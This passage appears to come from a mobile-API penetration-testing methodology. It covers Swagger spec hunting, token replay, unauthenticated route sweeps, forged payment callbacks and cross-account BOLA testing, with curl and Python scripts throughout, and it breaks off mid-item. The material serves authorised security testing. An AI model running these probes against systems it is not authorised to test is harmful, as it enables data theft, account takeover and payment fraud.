  specifically and test them for authorisation bugs already fixed on the phone client.
- **How:**
  ```bash
  grep -rnE 'https?://[a-zA-Z0-9./_-]+' $S | grep -iE 'wear|watch|auto|car|tv|leanback|widget|tile|glance' | sort -u
  comm -23 <(sort -u companion_routes.txt) <(sort -u phone_routes.txt)
  ```
  Replay each with a low-privilege token and with another owned account's object id.
- **Proof:** A 200 with another user's data from a companion-only endpoint whose phone equivalent returns 403 —
  the status-code delta between the two paths is the artefact.
- **Escalation:** Companion tokens often have longer lifetimes and looser scope; check both (D15-021).
- **Ruled out when:** The app ships no companion module (`unzip -l` shows no wear/tv APK or feature module) or
  the companion routes are a strict subset of the phone routes and enforce the same checks.

### D15-016 · Probe endpoints left live from a retired Instant App experience

| | |
|---|---|
| **Severity ceiling** | High (per data returned) |
| **VRT** | `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) baseline; `broken_access_control.idor.*` if it returns user data |
| **Attacker** | AM-01 |
| **Applies to** | **LEGACY client surface, current server exposure.** Any app that ever shipped an instant experience |
| **Maps to** | API9:2023; Google Play Instant discontinuation (instant apps cannot be published as of December 2025 and the Play services Instant APIs stop working) |

- **Test:** Instant apps could only use a restricted subset of APIs and permissions, so teams built
  *permission-light, frequently unauthenticated* endpoints for them. The client side is dead; the endpoints
  frequently remain deployed and almost nobody checks them now.
- **How:**
  ```bash
  grep -rnE 'InstantApps|isInstantApp|dist:instant|dist:module|targetSandboxVersion' $S apktool_out/AndroidManifest.xml
  grep -rnE 'instant|/i/|/lite/|guest' $S | grep -iE 'http'
  for p in $(cat instant_paths.txt); do curl -s -o /dev/null -w "%{http_code} $p\n" "https://api.target$p"; done
  ```
- **Proof:** An unauthenticated 200 from an `/instant`-flavoured endpoint returning user or catalogue data.
- **Escalation:** Unauthenticated read of user data is a direct P1-band finding; unauthenticated *write* more so.
- **Ruled out when:** The manifest and history show the app never shipped an instant experience, or every
  recovered instant path returns 404/401 with a working positive control elsewhere on the same host.

### D15-017 · Diff the consumer APK's routes against the vendor's driver / merchant / staff APK

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES); `server_security_misconfiguration.exposed_portal.admin_portal` (P1) when it unlocks an admin surface |
| **Attacker** | AM-05 |
| **Applies to** | vendors shipping multiple apps against one backend |
| **Maps to** | API5:2023 Broken Function Level Authorization |

- **Test:** Staff, driver, merchant and partner builds of the same backend expose `/admin/`, `/internal/`,
  `/ops/`, `/partner/` routes. A consumer token sometimes reaches them, because the middleware authorises
  "authenticated" rather than "authorised for this role".
- **How:**
  ```bash
  # decompile the sibling APK too, then:
  comm -23 <(sort -u partner_routes.txt) <(sort -u consumer_routes.txt) > partner_only.txt
  while read -r p; do
    printf '%s -> ' "$p"
    curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $CONSUMER_TOKEN" "https://api.example.com$p"
  done < partner_only.txt
  ```
- **Proof:** 200 on a role-restricted endpoint with a token whose claims carry the lower role — show the
  decoded token next to the response body containing privileged data.
- **Escalation:** A partner list endpoint gives you the id space for the BOLA sweep; the two combine into
  "read/modify any account".
- **Ruled out when:** No sibling app exists, or every partner-only route returns 403 for the consumer token
  *with a body that differs from the authorised body* (D15-029) and the 403 is produced by an authorisation
  layer rather than by routing (a 404 on an unknown route is not evidence of authorisation).

### D15-018 · Hunt the OpenAPI/Swagger spec, live and archived

| | |
|---|---|
| **Severity ceiling** | Critical (with the consequence); Low/Informational for the spec alone |
| **VRT** | `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (VARIES); the consequence rates under `broken_access_control.*` |
| **Attacker** | AM-01 |
| **Applies to** | any API whose spec is reachable; default routes ship enabled in many .NET 6/7/8, Spring, FastAPI and Quarkus projects and stay on in production |
| **Maps to** | API8:2023 Security Misconfiguration; API9:2023 |

- **Test:** The spec discloses every endpoint, method, parameter name/type/format/max-length, model and
  validation rule — it is the mass-assignment wordlist and the BOLA target list in one file. A deprecated
  version's spec often stays indexed after the live link is removed, which is how you find zombie endpoints.
- **How:**
  ```bash
  for path in swagger swagger/v1/swagger.json swagger-ui.html api-docs api-docs.json v2/api-docs v3/api-docs \
              openapi.json .well-known/openapi.json swagger-resources docs redoc q/openapi nswag; do
    curl -s -o /dev/null -w "%{http_code} /$path\n" "https://$TARGET/$path"
  done
  curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*swagger*&output=json&collapse=urlkey"
  jq -r '.paths | keys[]' v1-swagger.json | sort > /tmp/v1_paths.txt
  jq -r '.paths | keys[]' v2-swagger.json | sort > /tmp/v2_paths.txt
  comm -23 /tmp/v1_paths.txt /tmp/v2_paths.txt          # v1-only -> forgotten-but-live candidates
  jq '.components.schemas' swagger.json                 # every model field, verbatim, for D15-065
  ```
  Flag 200 + `Content-Type: application/json` + a body matching `"swagger"` or `"openapi"`. `kiterunner` eats
  OpenAPI natively; `sj` (Swagger Jacker) and `apidetector` automate the probe.
- **Proof:** The spec **plus a consequence**: an endpoint reachable from your session with privileges it should
  not have. The canonical case is a spec documenting `/api/admin/users/{id}/reset-password` whose controller is
  missing `[Authorize(Roles="Admin")]`. A route documented only in an old spec must **execute**, not just
  return a deprecation stub.
- **Escalation:** `jq '.paths | keys' swagger.json` → the BOLA sweep and the hidden `/internal/*`, `/debug/*`,
  `/v0/*`, `/legacy/*` routes no UI references and no WAF rule covers. Where Swagger UI itself is exposed, test
  `?configUrl=` and `?url=` for spec injection (CVE-2018-25031 affects Swagger UI ≤ 4.1.2; CVE-2023-38337 is
  `rswag` directory traversal) — a victim's "Try It Out" click then fires same-origin authenticated requests.
- **Ruled out when:** Every spec path returns 404/401 on every host in the inventory including the archived
  ones, or the spec is served but every route it documents enforces the expected authorisation under a
  low-privilege token. Exposure of the spec alone, with no reachable over-privileged route, is on the
  never-submit list.

### D15-019 · Call the webhook, callback and server-to-server endpoints directly

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when unauthenticated state change is possible |
| **Attacker** | AM-01 |
| **Applies to** | all commerce/logistics apps |
| **Maps to** | API5:2023; API8:2023; WSTG-BUSL-02 Test Ability to Forge Requests |

- **Test:** Payment callbacks, delivery-partner webhooks and internal reconciliation endpoints are frequently
  on the same host as the mobile API and authenticated only by an IP allow-list or a shared secret that is
  in the APK.
- **How:**
  ```bash
  grep -rniE 'webhook|callback|notify|ipn|/internal/|s2s|server-to-server' endpoints.txt $S | head -30
  curl -s -o /dev/null -w '%{http_code}\n' -X POST https://api.example.com/v1/payments/callback \
    -H 'Content-Type: application/json' -d '{"orderId":"'"$MY_ORDER"'","status":"SUCCESS","amount":1}'
  ```
- **Proof:** *Your own* order transitioning to PAID without a real payment, read back through the normal
  user-facing endpoint. Use your own order id only.
- **Escalation:** If the callback signature is HMAC with a key found in the APK, you can sign valid callbacks —
  which also proves the key must be rotated (→ D12/D18). Combine with D15-090 for the replay variant.
- **Ruled out when:** The endpoint rejects requests without a valid signature, the signature key is
  server-side-only (not in the APK), and the handler is idempotent per event id — all three, demonstrated.

### D15-020 · Get the lab egress IP allow-listed, and record which controls were suppressed

| | |
|---|---|
| **Severity ceiling** | Support (with direct severity consequence) |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | all engagements with a live backend |
| **Maps to** | NIST SP 800-115 Appendix B §5.2 (Technical Test Components — "significant detail should be included on what activities will occur on the target network") |

- **Test:** WAF, bot defence, fraud engines and per-IP limits will throttle or ban the test accounts mid-sweep.
  Testers routinely misread a 429/403 wall as "rate limiting is implemented correctly" (a false negative) or
  burn a day on a banned account. Worse, a **suppressed** WAF invalidates every "rate limiting absent"
  conclusion you draw afterwards.
- **How:**
  ```bash
  curl -s https://ifconfig.me                      # the address mitmproxy will egress from
  # baseline BEFORE the sweep: 60 identical authorised requests, count the distribution
  for i in $(seq 1 60); do
    curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOK" https://api.target.example/v1/me
  done | sort | uniq -c
  ```
  Repeat after allow-listing. State in the report which controls were suppressed for testing.
- **Proof:** The status distribution before and after allow-listing, both in the evidence tree.
- **Escalation:** None — this gates the credibility of D15-086 and D15-087 in both directions.
- **Ruled out when:** n/a. If allow-listing is **refused**, every negative in this chapter must be recorded as
  *"not established — upstream control interfered"*, never as *clean*.

### D15-021 · The cross-boundary check: does a "device-bound" token still work from curl?

| | |
|---|---|
| **Severity ceiling** | Critical in combination with any token-leak primitive; Medium standalone |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when it enables takeover |
| **Attacker** | AM-05 (and AM-03/AM-06 once combined with a leak primitive) |
| **Applies to** | all. Run this **before** anything else in D15 |
| **Maps to** | API2:2023 Broken Authentication; RFC 9449 (DPoP) for what real sender-constraining looks like |

- **Test:** The single highest-value mobile auth check and it takes two minutes. Take the exact `Authorization`
  value the app sends, move it to a different machine, IP and user-agent, and see whether the server still
  honours it. Vendors routinely describe tokens as device-bound because the *client* attaches a device id —
  which is not binding at all, because you can echo it too.
- **How:**
  ```bash
  curl -sS -i 'https://api.example.com/v2/me' -H "Authorization: Bearer $TOKEN"
  # then add back, one at a time, the headers the interceptor sets, to find which (if any) is enforced
  curl -sS -o /dev/null -w '%{http_code}\n' 'https://api.example.com/v2/me' \
       -H "Authorization: Bearer $TOKEN" -H "X-Device-Id: $DEVID"
  curl -sS -o /dev/null -w '%{http_code}\n' 'https://api.example.com/v2/me' \
       -H "Authorization: Bearer $TOKEN" -H "X-Device-Id: 00000000-0000-0000-0000-000000000000"
  ```
  Genuine binding is cryptographic: a DPoP proof (RFC 9449 — `htm`, `htu`, `iat`, `jti`, `ath`, `cnf`/`jkt`),
  mTLS, or a per-request HMAC over a key the server issued and the client cannot export.
- **Proof:** HTTP 200 with the account's data from a host that has never run the app, with no device-specific
  header or with the device header set to an arbitrary value. Capture the full response.
- **Escalation:** Everything. Once the token works from curl the whole sweep is scriptable; and a leaked token
  from D07/D09/D10/D11/D20 that works from anywhere is straightforward account takeover (→ D13).
- **Ruled out when:** Removing or altering the device header produces a 401 **with a different body**, *and*
  the mechanism is cryptographic rather than an echoed value — read the interceptor (D15-005) to confirm the
  client cannot itself produce the proof for an arbitrary device id. A short-lived bot-management cookie
  failing from curl is a harness artefact, not binding (D15-027).

### D15-022 · Establish a control response before declaring any endpoint unauthenticated

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-01 |
| **Applies to** | all API testing; mandatory before any auth-bypass claim |
| **Maps to** | field methodology (`hunt-spa-api` step 3) |

- **Test:** You cannot claim "this route has no auth" until you know what *correct* rejection looks like on
  this stack. A sibling API — a second host, or a different route group on the same host — is the ideal
  control, because it is the same framework, so a different response is a real authz gap rather than a
  framework quirk.
- **How:**
  ```bash
  curl -s -i -X POST https://api.target.com/api/users -H 'Content-Type: application/json' -d '{}'
  # secure -> 401, or {"error":"Missing or invalid authorization header"}
  ```
- **Proof:** A documented control response that differs from the candidate's response, with both captured.
- **Escalation:** → the unauthenticated-route sweep (D15-023) and every authz claim in this chapter.
- **Ruled out when:** n/a — this is a gate. Without a control, an "unauthenticated endpoint" claim is an
  assertion.

### D15-023 · Sweep every APK-derived route unauthenticated — and read the error taxonomy

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `broken_access_control.idor.*` for the data returned |
| **Attacker** | AM-01 |
| **Applies to** | every APK-derived endpoint list |
| **Maps to** | API2:2023; API5:2023; CWE-306 Missing Authentication for Critical Function |

- **Test:** The APK's endpoint inventory is the API surface for free. Strip the `Authorization` header and
  replay each route with both verbs. The *response taxonomy* is the valuable part, not the status code.
- **How:**
  ```python
  # Python, not a shell loop (D15-032). Count your results.
  import json, subprocess
  routes = [l.strip() for l in open('endpoints.txt') if l.strip()]
  out = []
  for r in routes:
      for m in ('GET','POST'):
          try:
              p = subprocess.run(['curl','-s','-o','/tmp/r','-w','%{http_code}','-X',m,
                                  '-H','Content-Type: application/json','-d','{}',
                                  f'https://api.target.com/{r}'], capture_output=True, text=True, timeout=20)
              body = open('/tmp/r','rb').read()[:400]
              out.append((m, r, p.stdout, len(body), body))
          except Exception as e:
              out.append((m, r, 'ERR', 0, str(e).encode()))
  print(len(out), 'probes for', len(routes), 'routes')   # must equal 2 x len(routes)
  ```
  Taxonomy:
  - `401` / `"Missing authorization"` → gated. Move on.
  - `200` with data → **unauthenticated data exposure. Finding.**
  - `400 "field X is mandatory"` → **do not celebrate yet — see D15-024.**
  - `200` + verbose DB/stack error (`PROCEDURE db_x.sp_y does not exist`) → reached the data layer
    unauthenticated; also an injection-surface signal.
  - Mandatory fields named `is_admin` / `is_internal` / `requested_by` / `role_id` / `account_type` →
    **authorisation derived from client-supplied parameters.** Critical-class.
- **Proof:** Cross-account data or a privileged response returned with no token, next to the D15-022 control.
- **Escalation:** IDs returned by one route (`account_id`, `order_id`, `deal_id`) are the keys the *other*
  routes consume. **Stop at minimum-necessary proof; do not enumerate the table.**
- **Ruled out when:** Every route returns the control rejection shape with an empty or minimal body, from a
  client that has never held a session (fresh cookie jar, no bot-management cookie), and the positive control
  on the same host still succeeds.

### D15-024 · THE LAYER-ORDERING TRAP — a validation error does NOT prove you passed auth

| | |
|---|---|
| **Severity ceiling** | Support (a kill gate) |
| **VRT** | n/a |
| **Attacker** | AM-01 |
| **Applies to** | **every auth-bypass claim** |
| **Maps to** | field methodology (`triage-validation` "THE LAYER-ORDERING TRAP") |

- **Test:** The highest-confidence false positive in the entire auth-bypass class. Many stacks put a global
  input sanitiser, body parser or schema filter *in front of* the auth middleware, so a malformed body is
  rejected before auth is ever consulted — and the response is indistinguishable from "auth passed, validation
  failed". Re-test with a minimal **well-formed** body before claiming anything.
- **How:**
  ```bash
  curl -s -i -X POST https://target/api/v1/resource -d '{'
  # 400 {"code":"ERR-INPUT-0001","message":"Invalid text. Only permitted characters are allowed"}  <- looks like auth bypass
  curl -s -i -X POST https://target/api/v1/resource -H 'Content-Type: application/json' -d '{}'
  # 401 {"code":"ERR-AUTH-0001","message":"Not authenticated. Please log in."}
  ```
- **Proof:** Only the second response tells you where the auth layer sits. If the error text is about **input
  shape or character class**, you are talking to a parser, not business logic. If it names a **domain field**
  (`accountId is required`) *and* a well-formed `{}` still returns it, that is real signal.
- **Escalation:** n/a — this is a kill gate. It applies equally to WAF/CDN layers: an edge block is not an
  origin response.
- **Ruled out when:** The well-formed `{}` request returns 401/403. Then the route is gated and the validation
  error you saw was a parser in front of the auth layer. Record it; do not file it.

### D15-025 · Prove non-determinism before you diff anything

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | all differential testing — injection, enumeration, authz, timing |
| **Maps to** | field methodology (local android-pentest reference 24 §B1) |

- **Test:** Before drawing any conclusion from a response difference, establish the endpoint's baseline
  variability. This is the single largest false-positive generator in API differential testing: an endpoint
  returning an unordered collection can produce identical content, identical byte length and a different hash
  on every call. The corpus's real case manufactured ~20 phantom "anomalies" in one injection sweep.
- **How:**
  ```bash
  for i in 1 2 3 4 5 6; do
    curl -s -X POST "$URL" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
      -d "$BODY" | tee /tmp/r$i.json | md5
  done
  diff <(jq -S . /tmp/r1.json) <(jq -S . /tmp/r2.json)
  norm(){ jq -S 'walk(if type=="array" then sort else . end)
          | del(.requestId,.timestamp,.traceId,.serverTime)' "$1"; }
  diff <(norm /tmp/r1.json) <(norm /tmp/r2.json)
  ```
- **Proof:** Six identical requests producing six identical *normalised* outputs, recorded in the report — that
  fact is what licenses every later differential claim.
- **Escalation:** Use the **same** normaliser across every harness in the engagement; two tools with different
  normalisation will disagree and you will chase the difference.
- **Ruled out when:** n/a — a gate. If the endpoint is non-deterministic and you cannot normalise it, say so
  and compare parsed structures rather than bytes.

### D15-026 · Establish the error oracle before any injection testing

| | |
|---|---|
| **Severity ceiling** | Support (produces a defensible negative, which is a deliverable) |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | all injection triage against a mobile API |
| **Maps to** | field methodology (reference 24 §B2) |

- **Test:** Measure how the endpoint responds to a spectrum of *non-payload* inputs before sending a single
  injection payload: **valid · absent · empty · wrong-length garbage · right-length garbage · quote-broken ·
  valid+quote · type-confused**. If every invalid variant returns a byte-identical response, the lookup is an
  exact match on an indexed/hashed key with no error propagation — injection there is **structurally ruled
  out**, and no quantity of payloads changes that.
- **How:**
  ```bash
  for v in "$VALID" "" "zzz" "$(printf 'a%.0s' $(seq 1 ${#VALID}))" "'" "${VALID}'" "[]" "true"; do
    printf '%-24s ' "${v:0:24}"
    enc=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$v")
    curl -s -o /tmp/o -w '%{http_code} %{size_download} ' "$URL?id=$enc" -H "Authorization: Bearer $TOKEN"
    md5 < /tmp/o
  done
  ```
- **Proof:** Either (a) a table of byte-identical responses — a defensible, evidenced **negative** for the
  ruled-out register; or (b) a differential, which is your oracle and makes subsequent injection testing
  meaningful.
- **Escalation:** With an oracle established, escalate to blind/time-based techniques knowing the channel
  exists. Without one, redirect effort to authorisation, business logic and races — which typed validation does
  not protect.
- **Ruled out when:** All eight variants return a byte-identical normalised response **and** a positive control
  request on the same endpoint succeeds (so you are reading the validation layer, not an outage).

### D15-027 · Recognise modern input-validation signatures and stop early

| | |
|---|---|
| **Severity ceiling** | Support (negative evidence) |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | Symfony/Laravel/DRF/Spring-validation-style backends — most modern API estates |
| **Maps to** | field methodology (reference 24 §B3) |

- **Test:** Framework-level typed validation closes whole injection classes before the value reaches storage.
  Recognising the signature saves days and produces a better report than an open-ended "we tried more
  payloads".
- **How:** Match observed responses against these verified stop conditions and record each as a **positive
  control observation**:

  | Observed | Means | Consequence |
  |---|---|---|
  | `{"field":"X","error":"The value you selected is not a valid choice."}` | enum allow-list | the value never becomes query text; ORDER BY / enum injection is impossible |
  | `"This value should be of type string."` | typed schema | type confusion and NoSQL-operator injection closed |
  | `q=x`, `q=x'`, `q=x''` → identical result counts | tokenising search engine, not SQL concatenation | not a concatenation sink |
  | path `'` and `../` → "unknown method" | exact router matching | path injection/traversal closed |
  | structurally different payloads → identical `400` | typed validation failing closed | no differential to exploit |

- **Proof:** The literal response bodies in the ruled-out table, plus a positive control showing the endpoint
  is live.
- **Escalation:** Redirect effort to authorisation, business logic and race conditions.
- **Ruled out when:** n/a — this item *is* the ruled-out mechanism. Do not use it to skip authorisation
  testing: typed validation protects none of D15-034 onwards.

### D15-028 · Know which layer answered you

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | all API testing |
| **Maps to** | field methodology (reference 24 §B4) |

- **Test:** Four specific misreads that look like application behaviour:
  - **Zero-byte body + 4xx** (md5 `d41d8cd98f00b204e9800998ecf8427e`, the md5 of the empty string) → edge or
    protocol rejection. **HTTP header values are ISO-8859-1**; fullwidth/unicode payloads die at the proxy and
    never reach the app.
  - **Stale bot-management cookie** (`__cf_bm` and friends) → *every* request returns a uniform 401/403
    indistinguishable from a revoked session. Re-pull the jar from the device and re-test.
  - **Duplicate cookies** — the WebView `Cookies` DB holds both `host` and `.host` rows; naively joining them
    sends the same name twice and yields 400s that look like server behaviour. Dedupe, preferring the
    exact-host row.
  - **429 means stop.** It is not an injection signal, and **it poisons every differential collected after it.**
- **How:** Capture status + body md5 + which client produced it, for every anomaly, before interpreting it.
  Cross-check by driving the app itself: if the app still works, your client is the problem.
- **Proof:** The reproduction from the app itself (not curl) confirming or refuting the anomaly.
- **Escalation:** For reliable work, intercept and modify the **app's own in-flight requests** rather than
  replaying its jar from curl — bot cookies are short-lived and client-bound.
- **Ruled out when:** n/a — a gate applied to every anomaly before it becomes a candidate.

### D15-029 · Marker discipline and the Body-Diff Rule

| | |
|---|---|
| **Severity ceiling** | Support (a kill gate; the corpus's #1 N/A driver) |
| **VRT** | n/a |
| **Attacker** | AM-05 |
| **Applies to** | every access-control, reflection, cache-poisoning and bypass claim |
| **Maps to** | field methodology (`bb-methodology` PART 4; `hunt-idor` anti-patterns) |

- **Test:** Two rules that together kill most false positives in this domain. **Marker discipline:** the second
  account must carry a unique, unmistakable marker, and any reflection claim must be checked against the
  *baseline*. **Body-Diff Rule:** a bypass claim requires a response **body** differential, not a status code —
  a 200 with a byte-identical body is not a bypass.
- **How:**
  ```bash
  # 1. write an 8+ char random marker into account B before any cross-account test
  MARK="cp$(openssl rand -hex 5)"          # never test/marker/evil/attacker/payload/AAAA/your own domain
  curl -s -X PATCH https://api.example.com/v1/me -H "Authorization: Bearer $TOKEN_B" \
    -H 'Content-Type: application/json' -d '{"displayName":"victim-'"$MARK"'"}'
  # 2. before claiming reflection, search the BASELINE (no-marker) response for the marker
  curl -s "$URL" -H "Authorization: Bearer $TOKEN_A" | grep -c "$MARK"     # must be 0
  # 3. body diff, not status
  diff <(curl -s "$URL_BASELINE" -H "Authorization: Bearer $TOKEN_A" | jq -S .) \
       <(curl -s "$URL_BYPASS"   -H "Authorization: Bearer $TOKEN_A" | jq -S .)
  ```
- **Proof:** The marker present in the attacker session's response and absent from the baseline; and, for a
  bypass, a byte-level diff in the report identifying *what* changed (correlation id? timestamp? real content?).
- **Escalation:** n/a — kill gates. The four anti-patterns they catch: 200-with-empty-body; self-scoped data
  returned through an unsanitised parameter; a stale cache from a prior impersonation session; and fields that
  are already public on the user's own profile page.
- **Ruled out when:** The cross-account response lacks the marker, or the "bypass" body is byte-identical to
  the baseline. Both are true negatives and belong in the ruled-out register with the diff attached.

### D15-030 · The Statistical-Sample Rule for timing and rate-limit claims

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | timing oracles, user enumeration, rate-limit absence, race conditions |
| **Maps to** | field methodology (`bb-methodology` PART 4) |

- **Test:** Single outliers are not signal; network jitter routinely produces 2× outliers. Minimum **n ≥ 10
  interleaved trials per group** (control + test, randomised order, not back-to-back), with mean, median and σ
  per group; a signal requires the suspect group's mean to be **≥ 2σ above** the control's. For rate limits,
  sample 100+ attempts before claiming absence, and distinguish per-IP / per-account / per-session /
  per-username throttling.
- **How:**
  ```python
  import random, statistics, subprocess, time
  groups = {'control': 'nonexistent-8f3a@example.com', 'test': 'me@example.com'}
  samples = {k: [] for k in groups}
  order = [k for k in groups for _ in range(10)]
  random.shuffle(order)
  for k in order:
      t0 = time.perf_counter()
      subprocess.run(['curl','-s','-o','/dev/null','-X','POST','https://api.example.com/v1/auth/check',
                      '-H','Content-Type: application/json','-d',f'{{"email":"{groups[k]}"}}'],
                     capture_output=True)
      samples[k].append((time.perf_counter()-t0)*1000)
  for k, v in samples.items():
      print(k, 'n=%d mean=%.1f median=%.1f sd=%.1f' % (len(v), statistics.mean(v),
            statistics.median(v), statistics.pstdev(v)))
  ```
- **Proof:** The distribution, not the outlier. The corpus's worked retraction: `Administrator` took 1527 ms
  against a ~700 ms control on a single shot; n=80 interleaved across 8 groups collapsed every group to mean
  685–716 ms, σ 25–74 ms.
- **Escalation:** Where a real limit exists, quantify the math for the report ("10/min × 60 × 24 across N
  parallel sessions reaches 10⁶ in X days").
- **Ruled out when:** The groups overlap within 2σ at n ≥ 10, or the 429 appears within the sampled window at a
  consistent count. Both are documented negatives.

### D15-031 · Server-Policy-vs-State: a policy that always denies is not an oracle

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | every oracle/bypass claim |
| **Maps to** | field methodology (`bb-methodology` PART 4) |

- **Test:** Establish whether the differentiator tracks *your input* or a *fixed deny-list*. The corpus's case:
  a `download.aspx` "file-existence oracle" was an extension blocklist — `.ashx/.asmx/.svc/.config` are always
  blocked regardless of whether the file exists.
- **How:** Feed the oracle three classes of input: a value you know exists, a value you know does not, and a
  value that is structurally invalid. If the "positive" class is defined by the *shape* of the input rather
  than by server state, it is a policy, not an oracle.
- **Proof:** The three-class table. Corollary for bypass claims: a `403 → 200` flip with a spoofed header is
  meaningful; a `200` both with **and without** the header means the path was never protected.
- **Escalation:** n/a — kill gate.
- **Ruled out when:** The differentiator is reproduced by a value that cannot exist in the dataset — then it is
  policy and the "oracle" is retracted before it is written up.

### D15-032 · Shell-Loop Ban — count your results on every sweep

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | every automated sweep in this chapter, including agent-driven ones |
| **Maps to** | field methodology (`bb-methodology` PART 4 "Shell-Loop Ban") |

- **Test:** zsh array expansion fails **silently**. `for x in "${arr[@]}"` can produce zero iterations with no
  error when the array was not populated by the previous command, and the output still looks complete. The
  corpus's engagement lost ~50 verb-tampering probes to exactly this, with output that looked correct.
- **How:** Loops of ≤5 hardcoded items in shell are fine. Anything iterating a list, a file or a computed range
  goes to Python with `try/except` per iteration and explicit per-iteration logging. **Always assert the
  count:**
  ```python
  assert len(results) == len(routes) * len(methods), f'{len(results)} results for {len(routes)*len(methods)} probes'
  ```
- **Proof:** Result count matches input count, printed at the end of every sweep.
- **Escalation:** n/a.
- **Ruled out when:** n/a. A sweep whose count you did not assert produces neither findings nor negatives.

### D15-033 · Multi-Tool Reproduction Bar for every Critical/High claim

| | |
|---|---|
| **Severity ceiling** | Support (governs Critical/High) |
| **VRT** | n/a |
| **Attacker** | AM-12 harness |
| **Applies to** | every Critical/High in this chapter |
| **Maps to** | field methodology (`bb-methodology` Phase 5) |

- **Test:** Before labelling anything Critical or High, reproduce it via **two independent tools with different
  HTTP stacks**. Cross-tool consistency rules out tool artefacts — the corpus's curl-only timing differential
  vanished under Python `requests` and was an artefact, not a bug.
- **How:** `curl` + Burp Repeater; Python `requests` + a raw socket over `ssl`; Burp + `urllib`. The
  reproduction commands in the report **must be paste-into-shell ready** — a triager copies them verbatim;
  include a Python alternative when the curl form needs special flags.
- **Proof:** Two independent reproductions in the report, plus the five-screenshot state-change set for any
  state change: pre-state, the bug, the negative post-state (the control account unchanged), the positive
  post-state, and the side effect.
- **Escalation:** Apply the pre-severity gate against the **Critical claim**, not the bug: have you validated
  the *full* chain or only one primitive; what does the attacker walk away with in one sentence; have you
  reproduced end to end at least twice; is there an inheritance/signature/audience check still gating it; has
  the program rejected this severity class before.
- **Ruled out when:** n/a. If the second tool does not reproduce it, the finding is retracted in the appendix
  with the disproving evidence — **but a confirmed finding that stopped reproducing because the client patched
  mid-engagement is not retracted.** Keep timestamped pre-patch evidence.

### D15-034 · Two-account BOLA sweep across every path-parameter endpoint (read direction)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for read-only; the P1 node applies once write also works (D15-035) |
| **Attacker** | AM-05 |
| **Applies to** | all |
| **Maps to** | API1:2023 Broken Object Level Authorization (its documented scenario is a mobile API that fails to verify the VIN belongs to the authenticated user); MASWE-0018 (CWE-862, CWE-863); ATT&CK T1428; H1 #186279 ($1,500, `/api_android_v3/getUserVideos`), #754044, #203042 |

- **Test:** For each route from `idor_candidates.txt`, replay account **A**'s authenticated request with
  account **B**'s object id, where both accounts are tester-owned. This is the highest-yield test in a mobile
  engagement and the one that produces Critical ratings.
- **How:**
  ```bash
  # TOKEN_A / TOKEN_B from the proxy; ID_A / ID_B are objects you own; MARK written into B (D15-029)
  while read -r m path; do
    url_b=$(printf '%s' "$path" | sed "s/{[a-zA-Z]*[Ii]d}/$ID_B/g")
    code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X "$m" \
            -H "Authorization: Bearer $TOKEN_A" "https://api.example.com/$url_b")
    bytes=$(wc -c < /tmp/resp.json); hit=$(grep -c "$MARK" /tmp/resp.json)
    printf '%s\t%s\t%s\t%s\tmarker=%s\n' "$m" "$url_b" "$code" "$bytes" "$hit"
    [ "$code" = 200 ] && [ "$hit" -gt 0 ] && cp /tmp/resp.json "evidence/$(echo $url_b|tr / _).json"
  done < routes.tsv | tee bola_matrix.tsv
  ```
  Always include a **negative control**: the same request with a random/non-existent id, so you can show
  404 ≠ 403 ≠ 200 and prove the 200 is real data rather than a generic stub. Also test the id in every
  position: path, query, JSON body, header (`X-User-Id`), and multipart field.
- **Proof:** A saved response body containing account B's **marker**, retrieved with account A's token. Pair it
  with the same request under B's own token returning the byte-identical body — that equality is what makes it
  undeniable. Show A's own request, B-via-A, and the non-existent-id control together.
- **Escalation:** → D15-035 (write), D15-038 (scale), D15-060 (composition to ATO/money/privilege).
- **Ruled out when:** Every cross-account request returns a rejection whose **body** differs from the
  authorised body, the non-existent-id control returns the same rejection shape as the cross-account one
  (proving the check is ownership-based, not existence-based), and the marker never appears. **Discipline:
  never use a third party's real id**; if ids are non-guessable, create the second object yourself.

### D15-035 · Test the write direction separately — the P3→P1 fork

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (**P1**); modify-only is `.modify_sensitive_information_iterable_object_identifiers` (P2) |
| **Attacker** | AM-05 |
| **Applies to** | all |
| **Maps to** | API1:2023; H1 #757095 (Razer, "broken access control allowing other user's bank account to be deleted", $1,000, 311 upvotes), #753280 ($1,000), #1819832 ($15,000 remote deletion), #1213237 ($5,000, ~4.4M private messages) |

- **Test:** Read and write are different VRT nodes spanning three priority levels. Record precisely whether you
  can **view**, **modify**, or **both**, and prove the modification from the victim account's own session.
  Destructive verbs are the most under-tested and pay the most.
- **How:**
  ```bash
